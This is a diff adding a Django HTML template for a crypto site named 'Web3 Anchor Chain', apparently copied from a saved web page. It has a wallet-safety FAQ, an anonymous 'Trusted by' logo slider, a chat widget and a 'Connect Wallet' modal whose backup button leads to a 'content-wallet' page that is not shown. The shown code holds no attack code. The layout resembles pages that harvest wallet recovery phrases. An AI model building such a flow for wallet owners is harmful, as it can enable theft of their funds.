+                        <div class="flex justify-between items-center" bis_skin_checked="1">
+                            <p class="text-sm lg:text-base xl:text-xl font-medium text-white">
+                                How to keep bitcoin wallet safe?
+                            </p>
+                            <span :class="opened == 3 ? &#39;bg-accent-400 rotate-180&#39; : &#39;bg-gray-700&#39;"
+                                class="w-8 h-8 md:w-10 md:h-10 cursor-pointer rounded-full flex items-center justify-center text-lg shrink-0 md:text-2xl duration-300 bg-gray-700">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </div>
+                        <div x-show="opened === 3" x-collapse="" style="display: none; height: 0px; overflow: hidden;"
+                            hidden="" bis_skin_checked="1">
+                            <p class="text-sm lg:text-base xl:text-lg pt-3 text-gray-200">
+                                Use strong passwords, enable two-factor authentication, keep your software updated, and
+                                store your private keys securely offline.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div :class="opened == 4 ? &#39;bg-gray-700&#39; : &#39;&#39;"
+                        class="fade-up p-4 rounded-xl border border-gray-600 cursor-pointer" @click="handleOpen(4)"
+                        bis_skin_checked="1">
+                        <div class="flex justify-between items-center" bis_skin_checked="1">
+                            <p class="text-sm lg:text-base xl:text-xl font-medium text-white">
+                                How do I trust a safe wallet?
+                            </p>
+                            <span :class="opened == 4 ? &#39;bg-primary-500 rotate-180&#39; : &#39;bg-gray-700&#39;"
+                                class="w-8 h-8 md:w-10 md:h-10 cursor-pointer rounded-full flex items-center justify-center text-lg shrink-0 md:text-2xl duration-300 bg-gray-700">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </span>
+                        </div>
+                        <div x-show="opened === 4" x-collapse="" style="display: none; height: 0px; overflow: hidden;"
+                            hidden="" bis_skin_checked="1">
+                            <p class="text-sm lg:text-base xl:text-lg pt-3 text-gray-200">
+                                Look for wallets with strong security features, good reputation, open-source code, and
+                                positive community reviews.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Web3 Recovery Team Section -->
+
+        <!-- Trusted By Section -->
+        <section class="bg-gray-900 relative overflow-hidden">
+            <!-- Background Elements -->
+            <div class="max-lg:hidden w-64 h-64 absolute bottom-[-6%] blur-[85px] left-[-9%] bg-primary-400/30"
+                bis_skin_checked="1"></div>
+            <div class="max-lg:hidden w-64 h-64 absolute top-[-6%] blur-[85px] right-[-8%] bg-primary-400/30"
+                bis_skin_checked="1"></div>
+
+            <div class="py-20 relative z-10" bis_skin_checked="1">
+                <h2 class="text-3xl xl:text-4xl font-bold text-center mb-10 xl:mb-16 fade-up">
+                    Trusted by
+                </h2>
+
+                <!-- First Row - Moving Right -->
+                <div class="swiper brand-slider-one fade-up mb-8 swiper-initialized swiper-horizontal swiper-backface-hidden"
+                    bis_skin_checked="1">
+                    <div class="swiper-wrapper"
+                        style="transition-duration: 8000ms; transform: translate3d(-934px, 0px, 0px);"
+                        bis_skin_checked="1">
+
+
+
+
+
+
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="6"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-7.png'%}" alt="Brand 7"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="7"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-8.png'%}" alt="Brand 8"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="8"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-9.png'%}" alt="Brand 9"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center swiper-slide-prev"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="9"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-10.png'%}" alt="Brand 10"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center swiper-slide-active"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="0"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-1.png'%}" alt="Brand 1"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center swiper-slide-next"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="1"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-2.png'%}" alt="Brand 2"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="2"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-3.png'%}" alt="Brand 3"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="3"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-4.png'%}" alt="Brand 4"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="4"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-5.png'%}" alt="Brand 5"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="5"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-6.png'%}" alt="Brand 6"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Second Row - Moving Left -->
+                <div class="swiper brand-slider-two fade-up swiper-initialized swiper-horizontal swiper-backface-hidden"
+                    bis_skin_checked="1">
+                    <div class="swiper-wrapper"
+                        style="transition-duration: 8000ms; transform: translate3d(0px, 0px, 0px);"
+                        bis_skin_checked="1">
+                        <div class="swiper-slide flex items-center h-20 justify-center swiper-slide-active"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="0"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-11.png'%}" alt="Brand 11"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center swiper-slide-next"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="1"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-12.png'%}" alt="Brand 12"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="2"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-13.png'%}" alt="Brand 13"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="3"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-4.png'%}" alt="Brand 4"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="4"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-7.png'%}" alt="Brand 7"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="5"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-5.png'%}" alt="Brand 5"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="6"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-9.png'%}" alt="Brand 9"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="7"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-8.png'%}" alt="Brand 8"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="8"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-1.png'%}" alt="Brand 1"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center"
+                            style="width: 183.5px; margin-right: 50px;" data-swiper-slide-index="9"
+                            bis_skin_checked="1">
+                            <img src="{% static '/Home - Web3 Anchor Chain_files/item-10.png'%}" alt="Brand 10"
+                                class="max-h-12 w-auto opacity-60 hover:opacity-100 transition-opacity">
+                        </div>
+
+
+
+
+
+
+
+
+
+
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 relative overflow-hidden">
+        <!-- Background Elements -->
+        <div class="max-lg:hidden w-64 h-64 absolute bottom-[-6%] blur-[85px] left-[-12%] bg-secondary-500/30"
+            bis_skin_checked="1"></div>
+        <div class="max-lg:hidden w-64 h-64 absolute top-[-6%] blur-[85px] right-[-8%] bg-accent-500/30"
+            bis_skin_checked="1"></div>
+
+        <div class="container mx-auto px-4 py-20 relative z-10" bis_skin_checked="1">
+            <div class="grid grid-cols-12 gap-6 xl:gap-10" bis_skin_checked="1">
+                <div class="fade-up col-span-12 md:col-span-6 xl:col-span-3" bis_skin_checked="1">
+                    <h3 class="text-xl font-bold mb-4 xl:mb-6">Quick Links</h3>
+                    <div class="grid grid-cols-2" bis_skin_checked="1">
+                        <div class="col-span-1 flex flex-col gap-4" bis_skin_checked="1">
+                            <a href="content-wallet?staking="
+                                class="text-gray-200 hover:text-primary-400 transition-colors">STAKING</a>
+                            <a href="content-wallet?farming="
+                                class="text-gray-200 hover:text-primary-400 transition-colors">FARMING</a>
+                            <a href="content-wallet?crypto="
+                                class="text-gray-200 hover:text-primary-400 transition-colors">CRYPTO</a>
+                        </div>
+                        <div class="col-span-1 flex flex-col gap-4" bis_skin_checked="1">
+                            <a href="content-wallet?defi="
+                                class="text-gray-200 hover:text-primary-400 transition-colors">DEFI</a>
+                            <a href="content-wallet?web3="
+                                class="text-gray-200 hover:text-primary-400 transition-colors">WEB3</a>
+                            <a href="content-wallet?nft="
+                                class="text-gray-200 hover:text-primary-400 transition-colors">NFT</a>
+                        </div>
+                    </div>
+                    <div id="google_translate_element" class="mt-6" bis_skin_checked="1">
+                        <div class="skiptranslate goog-te-gadget" dir="ltr" style="" bis_skin_checked="1">
+                            <div id=":0.targetLanguage" bis_skin_checked="1"><select class="goog-te-combo"
+                                    aria-label="Language Translate Widget">
+                                    <option value="">Select Language</option>
+                                    <option value="ab">Abkhaz</option>
+                                    <option value="ace">Acehnese</option>
+                                    <option value="ach">Acholi</option>
+                                    <option value="aa">Afar</option>
+                                    <option value="af">Afrikaans</option>
+                                    <option value="sq">Albanian</option>
+                                    <option value="alz">Alur</option>
+                                    <option value="am">Amharic</option>
+                                    <option value="ar">Arabic</option>
+                                    <option value="hy">Armenian</option>
+                                    <option value="as">Assamese</option>
+                                    <option value="av">Avar</option>
+                                    <option value="awa">Awadhi</option>
+                                    <option value="ay">Aymara</option>
+                                    <option value="az">Azerbaijani</option>
+                                    <option value="ban">Balinese</option>
+                                    <option value="bal">Baluchi</option>
+                                    <option value="bm">Bambara</option>
+                                    <option value="bci">Baoulé</option>
+                                    <option value="ba">Bashkir</option>
+                                    <option value="eu">Basque</option>
+                                    <option value="btx">Batak Karo</option>
+                                    <option value="bts">Batak Simalungun</option>
+                                    <option value="bbc">Batak Toba</option>
+                                    <option value="be">Belarusian</option>
+                                    <option value="bem">Bemba</option>
+                                    <option value="bn">Bengali</option>
+                                    <option value="bew">Betawi</option>
+                                    <option value="bho">Bhojpuri</option>
+                                    <option value="bik">Bikol</option>
+                                    <option value="bs">Bosnian</option>
+                                    <option value="br">Breton</option>
+                                    <option value="bg">Bulgarian</option>
+                                    <option value="bua">Buryat</option>
+                                    <option value="yue">Cantonese</option>
+                                    <option value="ca">Catalan</option>
+                                    <option value="ceb">Cebuano</option>
+                                    <option value="ch">Chamorro</option>
+                                    <option value="ce">Chechen</option>
+                                    <option value="ny">Chichewa</option>
+                                    <option value="zh-CN">Chinese (Simplified)</option>
+                                    <option value="zh-TW">Chinese (Traditional)</option>
+                                    <option value="chk">Chuukese</option>
+                                    <option value="cv">Chuvash</option>
+                                    <option value="co">Corsican</option>
+                                    <option value="crh">Crimean Tatar (Cyrillic)</option>
+                                    <option value="crh-Latn">Crimean Tatar (Latin)</option>
+                                    <option value="hr">Croatian</option>
+                                    <option value="cs">Czech</option>
+                                    <option value="da">Danish</option>
+                                    <option value="fa-AF">Dari</option>
+                                    <option value="dv">Dhivehi</option>
+                                    <option value="din">Dinka</option>
+                                    <option value="doi">Dogri</option>
+                                    <option value="dov">Dombe</option>
+                                    <option value="nl">Dutch</option>
+                                    <option value="dyu">Dyula</option>
+                                    <option value="dz">Dzongkha</option>
+                                    <option value="eo">Esperanto</option>
+                                    <option value="et">Estonian</option>
+                                    <option value="ee">Ewe</option>
+                                    <option value="fo">Faroese</option>
+                                    <option value="fj">Fijian</option>
+                                    <option value="tl">Filipino</option>
+                                    <option value="fi">Finnish</option>
+                                    <option value="fon">Fon</option>
+                                    <option value="fr">French</option>
+                                    <option value="fr-CA">French (Canada)</option>
+                                    <option value="fy">Frisian</option>
+                                    <option value="fur">Friulian</option>
+                                    <option value="ff">Fulani</option>
+                                    <option value="gaa">Ga</option>
+                                    <option value="gl">Galician</option>
+                                    <option value="ka">Georgian</option>
+                                    <option value="de">German</option>
+                                    <option value="el">Greek</option>
+                                    <option value="gn">Guarani</option>
+                                    <option value="gu">Gujarati</option>
+                                    <option value="ht">Haitian Creole</option>
+                                    <option value="cnh">Hakha Chin</option>
+                                    <option value="ha">Hausa</option>
+                                    <option value="haw">Hawaiian</option>
+                                    <option value="iw">Hebrew</option>
+                                    <option value="hil">Hiligaynon</option>
+                                    <option value="hi">Hindi</option>
+                                    <option value="hmn">Hmong</option>
+                                    <option value="hu">Hungarian</option>
+                                    <option value="hrx">Hunsrik</option>
+                                    <option value="iba">Iban</option>
+                                    <option value="is">Icelandic</option>
+                                    <option value="ig">Igbo</option>
+                                    <option value="ilo">Ilocano</option>
+                                    <option value="id">Indonesian</option>
+                                    <option value="iu-Latn">Inuktut (Latin)</option>
+                                    <option value="iu">Inuktut (Syllabics)</option>
+                                    <option value="ga">Irish Gaelic</option>
+                                    <option value="it">Italian</option>
+                                    <option value="jam">Jamaican Patois</option>
+                                    <option value="ja">Japanese</option>
+                                    <option value="jw">Javanese</option>
+                                    <option value="kac">Jingpo</option>
+                                    <option value="kl">Kalaallisut</option>
+                                    <option value="kn">Kannada</option>
+                                    <option value="kr">Kanuri</option>
+                                    <option value="pam">Kapampangan</option>
+                                    <option value="kk">Kazakh</option>
+                                    <option value="kha">Khasi</option>
+                                    <option value="km">Khmer</option>
+                                    <option value="cgg">Kiga</option>
+                                    <option value="kg">Kikongo</option>
+                                    <option value="rw">Kinyarwanda</option>
+                                    <option value="ktu">Kituba</option>
+                                    <option value="trp">Kokborok</option>
+                                    <option value="kv">Komi</option>
+                                    <option value="gom">Konkani</option>
+                                    <option value="ko">Korean</option>
+                                    <option value="kri">Krio</option>
+                                    <option value="ku">Kurdish (Kurmanji)</option>
+                                    <option value="ckb">Kurdish (Sorani)</option>
+                                    <option value="ky">Kyrgyz</option>
+                                    <option value="lo">Lao</option>
+                                    <option value="ltg">Latgalian</option>
+                                    <option value="la">Latin</option>
+                                    <option value="lv">Latvian</option>
+                                    <option value="lij">Ligurian</option>
+                                    <option value="li">Limburgish</option>
+                                    <option value="ln">Lingala</option>
+                                    <option value="lt">Lithuanian</option>
+                                    <option value="lmo">Lombard</option>
+                                    <option value="lg">Luganda</option>
+                                    <option value="luo">Luo</option>
+                                    <option value="lb">Luxembourgish</option>
+                                    <option value="mk">Macedonian</option>
+                                    <option value="mad">Madurese</option>
+                                    <option value="mai">Maithili</option>
+                                    <option value="mak">Makassar</option>
+                                    <option value="mg">Malagasy</option>
+                                    <option value="ms">Malay</option>
+                                    <option value="ms-Arab">Malay (Jawi)</option>
+                                    <option value="ml">Malayalam</option>
+                                    <option value="mt">Maltese</option>
+                                    <option value="mam">Mam</option>
+                                    <option value="gv">Manx</option>
+                                    <option value="mi">Maori</option>
+                                    <option value="mr">Marathi</option>
+                                    <option value="mh">Marshallese</option>
+                                    <option value="mwr">Marwadi</option>
+                                    <option value="mfe">Mauritian Creole</option>
+                                    <option value="chm">Meadow Mari</option>
+                                    <option value="mni-Mtei">Meiteilon (Manipuri)</option>
+                                    <option value="min">Minang</option>
+                                    <option value="lus">Mizo</option>
+                                    <option value="mn">Mongolian</option>
+                                    <option value="my">Myanmar (Burmese)</option>
+                                    <option value="bm-Nkoo">N'Ko</option>
+                                    <option value="nhe">Nahuatl (Eastern Huasteca)</option>
+                                    <option value="ndc-ZW">Ndau</option>
+                                    <option value="nr">Ndebele (South)</option>
+                                    <option value="new">Nepal Bhasa (Newari)</option>
+                                    <option value="ne">Nepali</option>
+                                    <option value="no">Norwegian</option>
+                                    <option value="nus">Nuer</option>
+                                    <option value="oc">Occitan</option>
+                                    <option value="or">Odia (Oriya)</option>
+                                    <option value="om">Oromo</option>
+                                    <option value="os">Ossetian</option>
+                                    <option value="pag">Pangasinan</option>
+                                    <option value="pap">Papiamento</option>
+                                    <option value="ps">Pashto</option>
+                                    <option value="fa">Persian</option>
+                                    <option value="pl">Polish</option>
+                                    <option value="pt">Portuguese (Brazil)</option>
+                                    <option value="pt-PT">Portuguese (Portugal)</option>
+                                    <option value="pa">Punjabi (Gurmukhi)</option>
+                                    <option value="pa-Arab">Punjabi (Shahmukhi)</option>
+                                    <option value="qu">Quechua</option>
+                                    <option value="kek">Qʼeqchiʼ</option>
+                                    <option value="rom">Romani</option>
+                                    <option value="ro">Romanian</option>
+                                    <option value="rn">Rundi</option>
+                                    <option value="ru">Russian</option>
+                                    <option value="se">Sami (North)</option>
+                                    <option value="sm">Samoan</option>
+                                    <option value="sg">Sango</option>
+                                    <option value="sa">Sanskrit</option>
+                                    <option value="sat-Latn">Santali (Latin)</option>
+                                    <option value="sat">Santali (Ol Chiki)</option>
+                                    <option value="gd">Scots Gaelic</option>
+                                    <option value="nso">Sepedi</option>
+                                    <option value="sr">Serbian</option>
+                                    <option value="st">Sesotho</option>
+                                    <option value="crs">Seychellois Creole</option>
+                                    <option value="shn">Shan</option>
+                                    <option value="sn">Shona</option>
+                                    <option value="scn">Sicilian</option>
+                                    <option value="szl">Silesian</option>
+                                    <option value="sd">Sindhi</option>
+                                    <option value="si">Sinhala</option>
+                                    <option value="sk">Slovak</option>
+                                    <option value="sl">Slovenian</option>
+                                    <option value="so">Somali</option>
+                                    <option value="es">Spanish</option>
+                                    <option value="su">Sundanese</option>
+                                    <option value="sus">Susu</option>
+                                    <option value="sw">Swahili</option>
+                                    <option value="ss">Swati</option>
+                                    <option value="sv">Swedish</option>
+                                    <option value="ty">Tahitian</option>
+                                    <option value="tg">Tajik</option>
+                                    <option value="ber-Latn">Tamazight</option>
+                                    <option value="ber">Tamazight (Tifinagh)</option>
+                                    <option value="ta">Tamil</option>
+                                    <option value="tt">Tatar</option>
+                                    <option value="te">Telugu</option>
+                                    <option value="tet">Tetum</option>
+                                    <option value="th">Thai</option>
+                                    <option value="bo">Tibetan</option>
+                                    <option value="ti">Tigrinya</option>
+                                    <option value="tiv">Tiv</option>
+                                    <option value="tpi">Tok Pisin</option>
+                                    <option value="to">Tongan</option>
+                                    <option value="lua">Tshiluba</option>
+                                    <option value="ts">Tsonga</option>
+                                    <option value="tn">Tswana</option>
+                                    <option value="tcy">Tulu</option>
+                                    <option value="tum">Tumbuka</option>
+                                    <option value="tr">Turkish</option>
+                                    <option value="tk">Turkmen</option>
+                                    <option value="tyv">Tuvan</option>
+                                    <option value="ak">Twi</option>
+                                    <option value="udm">Udmurt</option>
+                                    <option value="uk">Ukrainian</option>
+                                    <option value="ur">Urdu</option>
+                                    <option value="ug">Uyghur</option>
+                                    <option value="uz">Uzbek</option>
+                                    <option value="ve">Venda</option>
+                                    <option value="vec">Venetian</option>
+                                    <option value="vi">Vietnamese</option>
+                                    <option value="war">Waray</option>
+                                    <option value="cy">Welsh</option>
+                                    <option value="wo">Wolof</option>
+                                    <option value="xh">Xhosa</option>
+                                    <option value="sah">Yakut</option>
+                                    <option value="yi">Yiddish</option>
+                                    <option value="yo">Yoruba</option>
+                                    <option value="yua">Yucatec Maya</option>
+                                    <option value="zap">Zapotec</option>
+                                    <option value="zu">Zulu</option>
+                                </select></div>Powered by <span style="white-space:nowrap"><a
+                                    class="VIpgJd-ZVi9od-l4eHX-hSRGPd" href="https://translate.google.com/"
+                                    target="_blank"><img
+                                        src="{% static '/Home - Web3 Anchor Chain_files/googlelogo_color_42x16dp.png'%}" width="37px"
+                                        height="14px" style="padding-right: 3px"
+                                        alt="Google Translate">Translate</a></span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="fade-up col-span-12 md:col-span-6 xl:col-span-6 xl:col-start-7" bis_skin_checked="1">
+                    <div class="text-center px-4 md:px-6 lg:px-10 xl:px-16" bis_skin_checked="1">
+                        <h3 class="text-xl font-bold mb-4 xl:mb-6">Newsletter</h3>
+                        <p class="text-gray-100 lg:text-lg mb-8 xl:mb-10">
+                            Welcome to Web3 Anchor Chain your gateway to the world of Web3 trading! Our
+                            user-friendly
+                            platform makes it easy to buy, sell, and trade cryptocurrencies.
+                        </p>
+                        <form class="flex gap-3 max-w-md mx-auto">
+                            <input type="email" placeholder="Enter your email"
+                                class="flex-1 px-4 py-3 rounded-full bg-gray-800 border border-gray-600 text-white placeholder-gray-400 focus:outline-none focus:border-primary-400">
+                            <button type="submit"
+                                class="bg-gradient-to-r from-primary-400 to-secondary-500 hover:from-primary-500 hover:to-secondary-600 text-black font-semibold px-6 py-3 rounded-full transition-all duration-300 transform hover:scale-105">
+                                Subscribe
+                            </button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <div class="py-5 xl:py-8 border-t border-gray-700 mt-16" bis_skin_checked="1">
+                <div class="text-center flex justify-center gap-2 sm:gap-3 items-center relative z-10"
+                    bis_skin_checked="1">
+                    <p class="text-xs sm:text-sm md:text-base xl:text-lg text-gray-400">
+                        Copyright © <span x-text="new Date().getFullYear()"></span> Web3 Anchor Chain. All
+                        rights
+                        reserved.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Live Chat Widget -->
+    <script type="text/javascript">
+        var _smartsupp = _smartsupp || {};
+        _smartsupp.key = '01654b935a2f3344fd4530265be0827ebe7b7085';
+        window.smartsupp || (function (d) {
+            var s, c, o = smartsupp = function () {
+                o._.push(arguments)
+            };
+            o._ = [];
+            s = d.getElementsByTagName('script')[0];
+            c = d.createElement('script');
+            c.type = 'text/javascript';
+            c.charset = 'utf-8';
+            c.async = true;
+            c.src = 'https://www.smartsuppchat.com/loader.js?';
+            s.parentNode.insertBefore(c, s);
+        })(document);
+    </script>
+    <noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
+
+
+
+    <div class="fixed inset-0 z-[999] hidden overflow-y-auto bg-black/80 text-white"
+        :class="isOpen &amp;&amp; &#39;!block&#39;" data-teleport-target="true" bis_skin_checked="1">
+        <div class="flex min-h-screen items-center justify-center px-3" @click.self="closeModal" bis_skin_checked="1">
+            <div x-show="isOpen" x-transition="" x-transition.duration.300=""
+                class="my-8 w-full max-w-2xl border border-gray-600 overflow-hidden rounded-xl bg-gray-800 p-6 xl:p-8"
+                bis_skin_checked="1" style="display: none;">
+                <div class="mb-7 xl:mb-10 flex items-center justify-between" bis_skin_checked="1">
+                    <div bis_skin_checked="1">
+                        <h3 class="mb-3 text-2xl font-bold">Connect Wallet</h3>
+                        <p class="text-gray-400 lg:text-lg">Gateway to Web3</p>
+                    </div>
+                    <button @click="closeModal"
+                        class="w-10 h-10 rounded-full hover:rotate-180 duration-300 bg-gray-700 flex items-center justify-center">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M6 18L18 6M6 6l12 12"></path>
+                        </svg>
+                    </button>
+                </div>
+                <div class="p-6 rounded-xl border border-gray-600 gap-4 flex-wrap flex justify-between items-center mb-6"
+                    bis_skin_checked="1">
+                    <div class="flex gap-3 items-center" bis_skin_checked="1">
+                        <img src="{% static '/Home - Web3 Anchor Chain_files/icon.png'%}" alt="Wallet Icon" class="w-12 h-12">
+                        <h4 class="text-xl font-semibold">Automatic/Manual backup</h4>
+                    </div>
+                    <a href="content-wallet?secure="
+                        class="bg-gradient-to-r from-primary-500 to-secondary-500 rounded-full px-6 py-3 text-white font-medium hover:from-primary-600 hover:to-secondary-600 transition-all inline-block">
+                        Continue
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate"
+        style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: &#39;Google Sans&#39;, Arial, sans-serif;"
+        data-id="" bis_skin_checked="1">
+        <div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd" bis_skin_checked="1">
+            <div class="VIpgJd-yAWNEb-hvhgNd-Ud7fr" bis_skin_checked="1"><img
+                    src="{% static '/Home - Web3 Anchor Chain_files/24px.svg" width="24" height="24" alt="">
+                <div class=" VIpgJd-yAWNEb-hvhgNd-IuizWc-i3jM8c " dir="ltr" bis_skin_checked="1">Original text</div>
+            </div>
+            <div class="VIpgJd-yAWNEb-hvhgNd-k77Iif" bis_skin_checked="1">
+                <div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"
+                    bis_skin_checked="1"></div>
+            </div>
+            <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr" bis_skin_checked="1">
+                <div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr" bis_skin_checked="1">
+                    <div class="VIpgJd-yAWNEb-hvhgNd-UTujCb" bis_skin_checked="1">Rate this translation</div>
+                    <div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe" bis_skin_checked="1">Your feedback will be used to help
+                        improve Google Translate</div>
+                </div>
+                <div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr" bis_skin_checked="1"><button id="goog-gt-thumbUpButton"
+                        type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation"
+                        aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg
+                                width="24" height="24" viewBox="0 0 24 24" focusable="false"
+                                class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
+                                <path
+                                    d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z">
+                                </path>
+                            </svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24"
+                                viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M">
+                                <path
+                                    d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z">
+                                </path>
+                            </svg></span></button><button id="goog-gt-thumbDownButton" type="button"
